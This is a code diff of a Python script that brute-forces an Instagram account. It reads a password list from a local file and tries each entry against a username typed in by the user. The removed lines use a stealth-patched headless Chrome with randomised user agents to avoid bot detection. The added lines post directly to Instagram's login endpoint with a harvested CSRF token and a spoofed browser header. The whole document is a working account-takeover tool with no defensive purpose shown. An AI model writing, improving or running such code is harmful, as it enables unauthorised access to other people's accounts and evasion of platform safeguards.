@@ -1,74 +1,68 @@
-import undetected_chromedriver as uc
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from fake_useragent import UserAgent
-from selenium_stealth import stealth
+import requests
+import json
 import time
 import os
 
+# Define the file path (update this path to match your setup)
 current_directory = os.path.dirname(os.path.abspath(__file__))
+file_path = os.path.join(current_directory, "pass.txt")
 
-# Instagram credentials
-username = input("Enter the username:  ")  # Replace with your actual username
-password_file = os.path.join(current_directory, "pass.txt")  # Path to your password file
+# Read all the passwords from the file into a list
+with open(file_path, "r") as file:
+    passwords = [line.strip() for line in file if line.strip()]  # Remove any empty lines
 
-# Read all passwords from the file
-with open(password_file, "r") as file:
-    passwords = [line.strip() for line in file if line.strip()]
+# Instagram login URL
+LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
 
-# Start undetected Chrome session
-ua = UserAgent()
-options = uc.ChromeOptions()
-options.headless = True
-options.add_argument("--no-sandbox")
-options.add_argument("--disable-dev-shm-usage")
-options.add_argument(f"user-agent={ua.random}")
+# Define headers for the request (these are necessary for the request to work)
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
+    'X-CSRFToken': '',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Referer': 'https://www.instagram.com/',
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
 
-driver = uc.Chrome(options=options)
-stealth(driver,
-        languages=["en-US", "en"],
-        vendor="Google Inc.",
-        platform="Win32",
-        webgl_vendor="Intel Inc.",
-        renderer="Intel Iris OpenGL Engine",
-        fix_hairline=True,
-        )
+# A session object to maintain cookies and session state
+session = requests.Session()
 
+# Get CSRF token
+session.get('https://www.instagram.com/')  # This is necessary to get the CSRF token
+csrf_token = session.cookies['csrftoken']
+headers['X-CSRFToken'] = csrf_token
 
-driver.get("https://www.instagram.com/accounts/login/")
-time.sleep(3)  # Wait for the page to load
+# Username to be used (hardcoded or obtained from elsewhere)
+username = input("Enter the username:  ")  # You can set this as per your use case
 
-# Locate the username and password fields
-username_input = driver.find_element(By.NAME, "username")
-password_input = driver.find_element(By.NAME, "password")
-
-# Set the username once
-username_input.clear()
-username_input.send_keys(username)
-
-# Attempt each password
+# Try each password one by one until login is successful
 for password in passwords:
-    print(f"Trying password: {password}")
+    try:
+        print(f"Trying password: {password}")
 
-    password_input.send_keys(Keys.CONTROL + 'a')  # Select all existing text
-    password_input.send_keys(Keys.DELETE)         # Delete selected text
-    time.sleep(2)  # Small delay for realism
+        # Define the login payload
+        payload = {
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',  # Emulates Instagram's password encryption method
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
 
-    # Enter the next password
-    password_input.send_keys(password)
-    password_input.send_keys(Keys.RETURN)  # Submit form
-    time.sleep(2.5)
-    driver.delete_all_cookies()
+        # Perform the login request
+        response = session.post(LOGIN_URL, data=payload, headers=headers)
+        login_response = json.loads(response.text)
 
-    # Check for login success (for example, URL check or specific element check)
-    if "login" not in driver.current_url:
-        print(f"Login successful with password: {password}")
-        break
-    else:
-        print(f"Login failed with password: {password}")
+        # Check the response
+        if login_response.get('authenticated'):
+            print("Login successful!")
+            break
+        else:
+            print(f"Login failed with password: {password}. Trying next password...")
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        print("Skipping to the next password...")
+
+        time.sleep(5)
+
 else:
-    print("Password not found in the provided list.")
-        
-# Close the driver after all attempts
-driver.quit()
-
+    print("All passwords failed.")
